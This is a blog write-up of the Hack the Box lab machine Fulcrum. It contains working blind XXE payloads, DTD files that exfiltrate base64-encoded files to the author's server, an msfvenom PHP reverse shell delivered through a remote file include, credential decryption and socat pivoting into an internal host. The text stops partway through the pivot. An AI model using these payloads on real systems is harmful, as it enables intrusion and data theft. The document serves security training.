---
layout: post
title: "Hack the Box - Fulcrum Write up"
date: 2018-06-27
description: "Write up for the Hack the box Machine Fulcrum."
categories: [write-up, hackthebox]
tags: [writeup, pentesting, hackthebox, xxe, windows, pivoting]
---

You can view the original write-up on my blog here: https://dastinia.io/write-up/hackthebox/2018/06/27/hackthebox-fulcrum-writeup/ I'm always open to questions or feedback.

## Introduction
<p align="center">
<img src="/assets/fulcrum/1.png" alt="Fulcrum" />
</p>

Wew this box had aaaaaaaaaalot of steps. Honestly, I feel like a lot of the difficultly perceived with this box came from the heavy need to use powershell. Nonetheless it definitely set the bar of being one of the more in-depth challenges because of all the steps required to reach the end goal. The pivoting was a very nice touch, and I wish there were more hack the box boxes that were architected in this manner with multiple machines or networks. I went a little bit more in-depth with the write-up, and included some fails, and rabbit-hole detection techniques.

## Tools Used
- [Nmap](https://nmap.org/)
- [BurpSuite](https://portswigger.net/)
- [GoBuster](https://github.com/OJ/gobuster) 
- [Ncat](https://nmap.org/ncat/)
- Powershell
- [Metasploit Framework](https://github.com/rapid7/metasploit-framework)
- [socat](http://www.dest-unreach.org/socat/) 
- [Nishang](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)

## Enumeration 
### Initial Scanning

Like always lets begin with a nmap scan agaisn't the fulcrum machine (10.10.10.62).
You need to run a full portscan to ensure you didn't miss the service running on port _56423_. 

```
root@dastinia:~/htb/fulcrum# nmap -T4 -sV -sC -Pn -p- 10.10.10.62 -oA fulcrum_fullscan
Starting Nmap 7.70 ( https://nmap.org ) at 2018-06-10 15:16 EDT
Nmap scan report for 10.10.10.62
Host is up (0.16s latency).
Not shown: 65529 closed ports
PORT      STATE SERVICE VERSION
4/tcp     open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
22/tcp    open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 a8:28:6e:d0:af:ab:46:de:c5:09:3d:76:ad:5a:44:e0 (RSA)
|   256 c1:5c:1d:ea:99:ec:e0:a1:dc:04:c5:5a:ad:50:36:f6 (ECDSA)
|_  256 a5:2f:44:e6:e3:10:cf:f7:db:15:d1:3f:49:21:3a:7b (ED25519)
80/tcp    open  http    nginx 1.10.3 (Ubuntu)
| http-methods:
|_  Potentially risky methods: TRACE
|_http-title: Input string was not in a correct format.
88/tcp    open  http    nginx 1.10.3 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_/
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: phpMyAdmin
9999/tcp  open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Login
56423/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Site doesn't have a title (application/json;charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 775.49 seconds
```

### Enumerating Port 4
Visting the web service on port 4, displays an "Under Maintenance" Page.

!["Under Maintenance"](/assets/fulcrum/9.png "Under Maintenance")


Clicking to try again redirects you to `/index.php? page=home`Looking at this we might be able to take advantage of a file include (or SSRF) type vulnerability just based on the `page` parameter. @Jhaddix gave a great talk called ["Hunt"](https://github.com/bugcrowd/HUNT/blob/master/slides/DEF%20CON%2025%20-%20HUNT.pdf) at defcon, and to sum it up it's an analysis of web vulnerabilities, and their most common parameters associated with those vulnerability." I highly recommend reading/watching the video on the talk because it will help recognize potential vulnberbilites in web applications much quicker. 

Running gobuster against the site, reveals us some additional content to explore.

```
root@dastinia:~/htb/fulcrum# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.62:4 -x php,html -s 200,204,301,302,307,403 -t 100 | tee gobuster_fulcrum_4r_fulcrum_4

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.62:4/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 302,307,403,200,204,301
[+] Extensions   : .php,.html
=====================================================
/index.php (Status: 200)
/home.php (Status: 200)
/upload.php (Status: 200)
=====================================================
```

Going directly to `http: //10.10.10.62:4/home.php` brings us to the fulcrum file upload page. 

!["Fulcrum File Upload"]({{site.url}}/assets/fulcrum/2.png "Fulcrum file upload")



Attempting to upload anything using the file upload capability always end up with an error occurring, even while attempting to upload a regular unmodified image file.  

!["Upload Failed Error Page"]({{site.url}}/assets/fulcrum/3.png "Upload File Error Page")

We are going to keep a note of this, because it will come in handy later.


### Enumerating Port 80

I also ran gobuster in the background. For some reason it's throwing (fake) IIS errors even though it was a ubuntu server using nginx. You could tell right off the back that this service was fake news, and was likely a rabbit hole so I didn't spend any resources digging deeper.



### Enumering Port 88 (phpmyadmin)

Attempting to authenticate with various combinations of common usernames, and passwords seen on hackthebox machines eg: `root:root`, `admin:admin`, `admin:password` etc..

Every time you attempt to authenticate the following error message would return.  

!["PHPmyAdmin SQL Error"](/assets/fulcrum/5.png)
From some quick [google searching](http://www.codecheese.com/2011/04/2002-the-server-is-not-responding-or-the-local-mysql-servers-socket-is-not-correctly-configured/) this likely meant  that the MySQL Server is misconfigured, or not accepting connections which likely means this was just another rabbit-hole. 


### Enumerating Port 9999 (PFSense)

Visiting the service on port `9999` brings us to the homepage of [PFsense](https://www.pfsense.org/) (an open-source firewall).

!["PFSense"](/assets/fulcrum/4.png "PFSense")

Attempting the default credentials for [PFsense](https://www.netgate.com/docs/pfsense/usermanager/pfsense-default-username-and-password.html), in addition to common hack the box username,password combinous resulted with nothing. 

You can observe from the footer copyright (which states 2004-2018) this is likely the latest version of PFSense. Another indicator that you can use, if you are familiar with pfsense and how it previously to looked within the past (two? years) they switched the [web interface UX styling](https://www.netgate.com/blog/bootstrapped-webgui-update.html) framework from their (not so pretty custom styling) to bootstrap. If you view the source code of the page, then you see the bootstrap includes, which lets you know that this is likely another rabbit-hole. 


### Enumerating Port 56423 (FulCrum API)

Visiting the service on Port `56423` brings us to what appears to be some sort of "API" endpoint. 

!["Fulcrum API"](/assets/fulcrum/10.png "Fulcrum API")

Hitting it with gobuster reveals that, it only has a single resource available for us to hit. 

```
root@dastinia:~/htb/fulcrum# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.62:56423 -x php,html -s 200,204,301,302,307,403 -t 100 | tee gobuster_fulcrum_56423

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.62:56423/
[+] Threads      : 100
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 403,200,204,301,302,307
[+] Extensions   : .php,.html
=====================================================
/index.php (Status: 200)
```

People generally skip over some of the inner thought process of discovering vulerbilities. But in this case, we have no real way of interacting with the api that's available, so we are likely looking for some sort of blind injection vulnerability. (OS, XPath, XXE, SQLi etc..). We can pretty much rule out an SQL injection because the SQL database from our prior enumeration earlier wasn't functioning.

After attempting a variety of blind injection attacks, you end up discovering it's blind XXE vulnerability.  The following [blog post](https://blog.zsec.uk/blind-xxe-learning/) is a good read on exploiting XXE vulerbilities. 

!["Testing for XXE Vulerbility w/ Burp Suite"](/assets/fulcrum/6.png "Testing for XXE Vulerbility w/ Burp suite")

_xxe test payload_
```
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.19:3434/" [
<!ELEMENT data (#PCDATA)>
]>
<data>4</data>
```

_response_
```
root@dastinia:~/htb/fulcrum# ncat -lnkvp 3434
Ncat: Version 7.70 ( https://nmap.org/ncat )
Ncat: Listening on :::3434
Ncat: Listening on 0.0.0.0:3434
Ncat: Connection from 10.10.10.62.
Ncat: Connection from 10.10.10.62:53288.
GET /test-t HTTP/1.0
Host: 10.10.14.19:3434
Connection: close
```

So we now we know what the vulnerability is, and we have a working "proof of concept". We can safely say that this is going to be the entry point into the box so now it's time to dive deeper. 

## Exploitation
### Using Blind XXE to Read Source Code Files 

Honestly, this part _fucking sucked_ for me. For some reason I'm awful either awful at following instructions, or there was something else going on, I clearly didn't know how XXE properly, which made the following section take _forever_. 

I used a combination of the following resources, finally put together a stable formula for performing the OOB XXE. I'm not 100% if it was intended, but using the `php://filter` pretty much was a requirement to pull data out through XXE (no other methods seemed to work). If you are just interested in getting the shell, it's safe to skip this section. 

I recommend reading the following resources to understand the different ways we can take advantage of an XXE vulnerability. 

Links: 
| [1](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_yarbabin_XXE_Jedi_Babin.pdf) 
| [2](https://blog.zsec.uk/out-of-band-xxe-2/) |
| [3](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870)


!["Using XXE to Request contents of "/etc/issue""](/assets/fulcrum/7.png "Using XXE to Request contents of "/etc/issue"")

_Contents of test.dtd_
```
root@dastinia:~/htb/fulcrum/serve# cat test.dtd
  <!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/issue">
  <!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://10.10.14.128/result?%payl;'>">
```

Upon successful exploitation, we should be receiving the contents of `/etc/issue` as a `base64` encoded string.

```
root@dastinia:~/htb/fulcrum/serve# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.62 - - [20/Jun/2018 21:46:50] "GET /test.dtd HTTP/1.0" 200 -
10.10.10.62 - - [20/Jun/2018 21:46:50] code 404, message File not found
10.10.10.62 - - [20/Jun/2018 21:46:50] "GET /result?Q3JlYXRlZCBieTogQE9uZUxvZ2ljYWxNeXRoCklQIEFkZHJlc3M6IFw0e2VuczMyfQpIb3N0bmFtZTogICBcbgoKR29vZCBMdWNrIQoKCg== HTTP/1.0" 404 -
```

Decoding it gives us the following content.

```
$ echo -n "Q3JlYXRlZCBieTogQE9uZUxvZ2ljYWxNeXRoCklQIEFkZHJlc3M6IFw0e2VuczMyfQpIb3N0bmFtZTogICBcbgoKR29vZCBMdWNrIQoKCg==" | base64 -d
Created by: @OneLogicalMyth
IP Address: \4{ens32}
Hostname:   \n

Good Luck!
```

By changing the file in `test.dtd` we can exfiltrate sensitive files, for further analysis, for example the contents of `/etc/passwd` or the fulcrum api source code. 

```
root:x:0:0:root:/root:/bin/bash
....[snip]....
messagebus:x:108:111::/var/run/dbus:/bin/false
blueprint:x:1000:1000:blueprint,,,:/home/blueprint:/bin/bash
colord:x:109:117:colord colour management daemon,,,:/var/lib/colord:/bin/false
libvirt-qemu:x:64055:115:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
libvirt-dnsmasq:x:110:118:Libvirt Dnsmasq,,,:/var/lib/libvirt/dnsmasq:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
```

_Fulcrum API Source Code_
```php
<?php
        header('Content-Type:application/json;charset=utf-8');
        header('Server: Fulcrum-API Beta');
        libxml_disable_entity_loader (false);
        $xmlfile = file_get_contents('php://input');
        $dom = new DOMDocument();
        $dom->loadXML($xmlfile,LIBXML_NOENT|LIBXML_DTDLOAD);
        $input = simplexml_import_dom($dom);
        $output = $input->Ping;
        //check if ok
        if($output == "Ping")
        {
                $data = array('Heartbeat' => array('Ping' => "Ping"));
        }else{
                $data = array('Heartbeat' => array('Ping' => "Pong"));
        }
        echo json_encode($data);


?>
```

From our further enumeration we know that there are other applications running on this box with known file names (results from enumerating the fulcrum web service on port 4). Attempting to access one of the known files like `home.php` ends with nothing being returned, so likely what this means that the other web apps are separated into different directories.

Attempting common web directories like _www, html, web, upload, uploads_ you discover that there is web-content being served from the `uploads` directory which so happens to be the content of the Fulcrum web application service being hosted on port 4. 

_dtd payload for discovering content in uploads web directory_
```
root@dastinia:~/htb/fulcrum/serve# cat test.dtd  


<!ENTITY % payl SYSTEM "php://filter/read=convert.base64-encode/resource=../uploads/index.php">  
<!ENTITY % intern "<!ENTITY &#37; xxe SYSTEM 'http://10.10.14.128/result?%payl;'>">
```

_results_
```
10.10.10.62 - - [20/Jun/2018 22:32:34] "GET /result?PD9waHAKaWYoJF9TRVJWRVJbJ1JFTU9URV9BRERSJ10gIT0gIjEyNy4wLjAuMSIpCnsKCWVjaG8gIjxoMT5VbmRlciBNYWludGFuY2U8L2gxPjxwPlBsZWFzZSA8YSBocmVmPVwiaHR0cDovLyIgLiAkX1NFUlZFUlsnU0VSVkVSX0FERFInXSAuICI6NC9pbmRleC5waHA/cGFnZT1ob21lXCI+dHJ5IGFnYWluPC9hPiBsYXRlci48L3A+IjsKfWVsc2V7CgkkaW5jID0gJF9SRVFVRVNUWyJwYWdlIl07CglpbmNsdWRlKCRpbmMuIi5waHAiKTsKfQo/PgoK HTTP/1.0" 404 -
```

Un-Base64'ing the response gives you the contents of _index.php_

```php
<?php
if($_SERVER['REMOTE_ADDR'] != "127.0.0.1")
{
	echo "<h1>Under Maintance</h1><p>Please <a href=\"http://" . $_SERVER['SERVER_ADDR'] . ":4/index.php?page=home\">try again</a> later.</p>";
}else{
	$inc = $_REQUEST["page"];
	include($inc.".php");
}
?>
```

_Contents of home.php_
```php
<?php
?>
<!DOCTYPE html>
<html>
<body>
<h1>Fulcrum File Upload</h1>

<form action="upload.php" method="post" enctype="multipart/form-data">
        Select image to upload:
        <p><input type="file" name="fileToUpload" id="fileToUpload"></p>
        <p><input type="submit" value="Upload Image" name="submit"></p>
</form>

</body>
</html>
```

_Contents of upload.php_
```php
<?php
	if(isset($_POST))
	{
		sleep(2);
		echo "<p style=\"color:red;\">Sorry the file upload failed</p>";
	}
?>
```
We can quickly see see that the code  in `index.php` is vulnerable  to a textbook `php file inclusion` vulnerability. The only thing is, to exploit this  vulnerability we need to have the request come from the machines `localhost`. If you attempt to access the page not from localhost it will give you the `Under maintenance ` page. But if the request comes from localhost we hit the 2nd code path of the application, and we have control over the `page` parameter which is getting passed directly into the `include` statement which we can use to get code execution. [Additional Reading](https://www.offensive-security.com/metasploit-unleashed/file-inclusion-vulnerabilities/)




### Getting Shell via Remote File Include 
For what it was worth, getting a shell was relatively simple to execute. You probably could have skipped all of the stuff in the middle section, and gone straight here if you are familiar with php web application vulnerabilities, and what they look like. I believe a lot of people who completed this box did just that. 


_generating a regular `msfvenom php reverse shell`_
```
root@dastinia:~/htb/fulcrum/serve# msfvenom -p php/reverse_php LHOST=10.10.15.74 LPORT=443 -f raw > 443.php
No platform was selected, choosing Msf::Module::Platform::PHP from the payload
No Arch selected, selecting Arch: php from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 3036 bytes
``` 

You are going to need to serve your payload with some sort of webserver. A python3 `http.server` is a quick way to throw up a webserver to host content.

_setting up python http.server_
```
root@dastinia:~/htb/fulcrum/serve# python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

_Setting up metasploit multi handler to catch shell_
```
msf > use exploit/multi/handler
msf exploit(multi/handler) > set PAYLOAD php/reverse_php
PAYLOAD => php/reverse_php
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > set ExitOnSession False
ExitOnSession => false
msf exploit(multi/handler) > exploit -j -z
[*] Exploit running as background job 0.

[*] Started reverse TCP handler on 10.10.15.74:443
```

Now all we need to do is to use our XXE vulnerability to craft a URL to fetch our payload to exploit the file include.

_raw request in burpsuite for exploiting the XXE to php file-include_
```
GET / HTTP/1.1

Host: 10.10.10.62:56423
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: pmaCookieVer=5; pma_lang=en; pma_collation_connection=utf8mb4_unicode_ci
Connection: close
Upgrade-Insecure-Requests: 1
Content-Length: 131


<!DOCTYPE root [

<!ENTITY % remote SYSTEM "http://127.0.0.1:4/index.php?page=http://10.10.15.74/443">

%remote; %intern; %xxe;

]>
```

Sweet got a shell, but getting a shell is only the beginning... 

_getting a shell after successful exploitation_
```
msf exploit(multi/handler) > [*] Command shell session 1 opened (10.10.15.74:443 -> 10.10.10.62:47692) at 2018-06-21 22:09:31 -0400

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/uploads
ls -la
total 24
drwxr-xr-x 2 root root 4096 Oct  5  2017 .
drwxr-xr-x 6 root root 4096 Oct  5  2017 ..
-rw-r--r-- 1 root root  714 Oct  4  2017 Fulcrum_Upload_to_Corp.ps1
-rw-r--r-- 1 root root  321 Oct  4  2017 home.php
-rw-r--r-- 1 root root  255 Oct  5  2017 index.php
-rw-r--r-- 1 root root  113 Oct  4  2017 upload.php
```

This shell is extremely unstable & will die after a few minutes, so I recommend throwing yourself a regular socat/netcat shell.

## Pivoting
### Decrypting/Recovering Credentials in Script for PSRemoting

Interestly we discover that there is a powershell script on the box, this is pretty unusual because this machine is labelled as a Linux system. 

__Contents of Fulcrum_Upload_to_Corp.ps1__
```Powershell
# TODO: Forward the PowerShell remoting port to the external interface
# Password is now encrypted \o/

$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
$4 = $3 | ConvertTo-SecureString -key $2
$5 = New-Object System.Management.Automation.PSCredential ($1, $4)

Invoke-Command -Computer upload.fulcrum.local -Credential $5 -File Data.ps1
```

We can modify the script slightly so that it decrypts the password for us. 

_decrypt.ps1_
```Powershell 
$1 = 'WebUser'
$2 = '77,52,110,103,63,109,63,110,116,80,97,53,53,77,52,110,103,63,109,63,110,116,80,97,53,53,48,48,48,48,48,48' -split ','
$3 = '76492d1116743f0423413b16050a5345MgB8AEQAVABpAHoAWgBvAFUALwBXAHEAcABKAFoAQQBNAGEARgArAGYAVgBGAGcAPQA9AHwAOQAwADgANwAxADIAZgA1ADgANwBiADIAYQBjADgAZQAzAGYAOQBkADgANQAzADcAMQA3AGYAOQBhADMAZQAxAGQAYwA2AGIANQA3ADUAYQA1ADUAMwA2ADgAMgBmADUAZgA3AGQAMwA4AGQAOAA2ADIAMgAzAGIAYgAxADMANAA='
$4 = $3 | ConvertTo-SecureString -key $2
[System.Runtime.InteropServices.marshal]::PtrToStringAuto([System.Runtime.InteropServices.marshal]::SecureStringToBSTR($4))
```
_Password of WebUser_
```
PS C:\> .\decrypt.ps1
M4ng£m£ntPa55
PS C:\>
```

### Discovering 192.168.122.x Network
After decrypting the password, the next step was to search for additional containers, virtual machines, or connected networks. 

Running an `ifconfig` we see this machine has many interfaces, which is extremely usual for a Hack the Box machine. A network address that stands our is `192.168.122.1` which is very strange. Likely this machine is dual-homed.

_ifconfig output_
```
www-data@Fulcrum:~$ ifconfig
corp      Link encap:Ethernet  HWaddr 52:54:00:87:ee:c0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:412 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:32601 (32.6 KB)  TX bytes:0 (0.0 B)

ens32     Link encap:Ethernet  HWaddr 00:50:56:b9:44:f1
          inet addr:10.10.10.62  Bcast:10.10.10.255  Mask:255.255.255.0
          inet6 addr: dead:beef::250:56ff:feb9:44f1/64 Scope:Global
          inet6 addr: fe80::250:56ff:feb9:44f1/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:72492 errors:0 dropped:82 overruns:0 frame:0
          TX packets:35844 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:11175820 (11.1 MB)  TX bytes:5982295 (5.9 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:241 errors:0 dropped:0 overruns:0 frame:0
          TX packets:241 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1
          RX bytes:18409 (18.4 KB)  TX bytes:18409 (18.4 KB)

virbr0    Link encap:Ethernet  HWaddr 52:54:00:9c:e7:10
          inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:53053 errors:0 dropped:0 overruns:0 frame:0
          TX packets:50375 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:3317157 (3.3 MB)  TX bytes:2463028 (2.4 MB)

vnet0     Link encap:Ethernet  HWaddr fe:54:00:32:d7:13
          inet6 addr: fe80::fc54:ff:fe32:d713/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:4904 errors:0 dropped:0 overruns:0 frame:0
          TX packets:16218 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:493632 (493.6 KB)  TX bytes:1118993 (1.1 MB)

vnet1     Link encap:Ethernet  HWaddr fe:54:00:74:9d:17
          inet6 addr: fe80::fc54:ff:fe74:9d17/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:53053 errors:0 dropped:0 overruns:0 frame:0
          TX packets:61628 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:4059899 (4.0 MB)  TX bytes:3048416 (3.0 MB)

vnet2     Link encap:Ethernet  HWaddr fe:54:00:32:59:e0
          inet6 addr: fe80::fc54:ff:fe32:59e0/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:6321 errors:0 dropped:0 overruns:0 frame:0
          TX packets:18278 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:599472 (599.4 KB)  TX bytes:2537511 (2.5 MB)

vnet3     Link encap:Ethernet  HWaddr fe:54:00:82:69:f5
          inet6 addr: fe80::fc54:ff:fe82:69f5/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:3146 errors:0 dropped:0 overruns:0 frame:0
          TX packets:15213 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:244122 (244.1 KB)  TX bytes:915975 (915.9 KB)

vnet4     Link encap:Ethernet  HWaddr fe:54:00:01:c6:b8
          inet6 addr: fe80::fc54:ff:fe01:c6b8/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:7031 errors:0 dropped:0 overruns:0 frame:0
          TX packets:17564 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:1952435 (1.9 MB)  TX bytes:1184340 (1.1 MB)

vnet5     Link encap:Ethernet  HWaddr fe:54:00:8f:b9:f9
          inet6 addr: fe80::fc54:ff:fe8f:b9f9/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1821 errors:0 dropped:0 overruns:0 frame:0
          TX packets:12593 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:289587 (289.5 KB)  TX bytes:785970 (785.9 KB)

web       Link encap:Ethernet  HWaddr 52:54:00:15:08:7e
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:583 errors:0 dropped:0 overruns:0 frame:0
          TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:65505 (65.5 KB)  TX bytes:0 (0.0 B)
``` 

To reduce our scope a bit, we can check the arp table, and see which machines that this machine has talked to recently.

```
www-data@Fulcrum:~$ arp -a

? (10.10.10.2) at 00:50:56:aa:9c:8d [ether] on ens32
? (192.168.122.228) at 52:54:00:74:9d:17 [ether] on virbr0
```

We see that there is a live host at `192.168.122.228`. Our next step was to discover what ports were open on this machine. There are many ways to scan a machine when you are on someone's internal network, but I prefer to drop a statically compiled version of nmap (and associated modules) if I have the ability to do so. It saves time, and I want to feel at home when I'm on someone's box. 

```
www-data@Fulcrum:/tmp/.scan$ wget http://10.10.15.74:6666/nmap.tar.gz
--2018-06-22 03:30:11--  http://10.10.15.74:6666/nmap.tar.gz
Connecting to 10.10.15.74:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4875842 (4.6M) [application/gzip]
Saving to: 'nmap.tar.gz'

nmap.tar.gz         100%[===================>]   4.65M  1.04MB/s    in 6.8s

2018-06-22 03:30:19 (705 KB/s) - 'nmap.tar.gz' saved [4875842/4875842]

www-data@Fulcrum:/tmp/.scan$ clear
TERM environment variable not set.
www-data@Fulcrum:/tmp/.scan$ ls
nmap.tar.gz
www-data@Fulcrum:/tmp/.scan$ tar -xvf nmap.tar.gz
...[snip]...
```

_Downloading our statically compiled nmap_
```
www-data@Fulcrum:/tmp/.scan$ wget http://10.10.15.74:6666/nmapstatic
--2018-06-22 03:36:28--  http://10.10.15.74:6666/nmapstatic
Connecting to 10.10.15.74:6666... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5944464 (5.7M) [application/octet-stream]
Saving to: 'nmapstatic'

nmapstatic          100%[===================>]   5.67M   576KB/s    in 11s

2018-06-22 03:36:40 (506 KB/s) - 'nmapstatic' saved [5944464/5944464]
```

To scanning with our statically compiled nmap, we use the `--datadir` option, with this we can portscan just like if we were doing it from our own box easily.

```
www-data@Fulcrum:/tmp/.scan$ ./nmapstatic --datadir nmap/ -p- 192.168.122.228

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2018-06-22 03:39 BST
Nmap scan report for 192.168.122.228
Host is up (0.0022s latency).
Not shown: 65532 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
5986/tcp open  wsmans
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 165.06 seconds
```

Like we thought, there seems to be a windows host attached with [Powershell remoteing](https://blogs.technet.microsoft.com/christwe/2012/06/20/what-port-does-powershell-remoting-use/) enabled. 


### Pivoting from Fulcrum Host to 192.168.122.x Network

To use PSRemoteing from my host machine properly, we are going to need to setup a pivot. The general gist of what we need to accomplish can be expressed with this diagram. 

!["Pivot Setup"](/assets/fulcrum/11.png "Pivot Setup")

I'm going to use `socat` for a majority of this because it's a tool I am very familiar with, and it's pretty easy to use. Although you can achieve the same results, using Metasploit, ssh, or some other like-minded tool.

We are going to listen for connections on port 55555 -> and relay that connection to `192.168.122.228` on port 5986 (PSRemoting port).

_on fulcrum machine (10.10.10.62)_

```
www-data@Fulcrum:/tmp/ ./socat tcp-listen:55555,reuseaddr,fork tcp:192.168.122.228:5986
```

_on my kali box (192.168.30.130)_ 

What is this doing is that it's going to listen for connections on port 5986 -> and relay that connection to 10.10.10.62 on port 55555. 

```
root@dastinia:~# socat tcp-listen:5986,reuseaddr,fork tcp:10.10.10.62:55555
```

Now from my (local) Windows 10 host we can connect to my Kali host (192.168.30.130), and it will relay that connection through our pivots to the network we are attempting to reach. 
We need the additional _-SessionOption_'s `SkipCACheck -SkipCNCheck` because you  get two error messages stating that `The SSL certificate is signed by an unknown certificate authority.` & `The SSL certificate contains a common name (CN) that does not match the hostname.`


```
PS C:\> Enter-PSSession -Computername 192.168.30.130 -Credential "Webuser" -UseSSL -SessionOption (New-PSSessionOption -SkipCACheck -SkipCNCheck)
[192.168.30.130]: PS C:\Users\WebUser\Documents> $env:UserName
WebUser
[192.168.30.130]: PS C:\Users\WebUser\Documents> $env:UserDomain
WEBSERVER
```

### Pivoting from WebServer to FileServer

If you attempt to read the contents of the user flag, you get a message stating that `You need to go deeper!`. Inspecting the `CheckFileServer.ps1` powershell script, we can see that they are hinting that most likely there is another host on the network. 

```Powershell
[192.168.30.130]: PS C:\Users\WebUser\Documents> dir


    Directory: C:\Users\WebUser\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/2/2017   8:39 PM            260 CheckFileServer.ps1
-a----       10/12/2017   4:23 AM          33266 Invoke-PsExec.ps1
-a----        10/2/2017   8:23 PM             24 user.txt



[192.168.30.130]: PS C:\Users\WebUser\Documents> type .\user.txt
You need to go deeper!

[192.168.30.130]: PS C:\Users\WebUser\Documents> type .\CheckFileServer.ps1
$Server = '127.0.0.1' # Waiting on IT to give me the address...
$Creds = Get-Credential -Message 'Please enter file server credentials'

Get-CimClass -ClassName win32_operatingsystem -ComputerName $Server -Credential $Creds

# TODO: can't get this to work
```


Since the hostname of this system is _"WebServer"_ we should probably inspect the contents of the webroot... Inspecting the contents of the `web.config` we find credentials which looks like it will allow us to run LDAP queries.  
```
[192.168.30.130]: PS C:\inetpub\wwwroot> dir


    Directory: C:\inetpub\wwwroot


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        10/2/2017   8:09 PM           5359 index.htm
-a----        10/2/2017   8:11 PM           1310 web.config


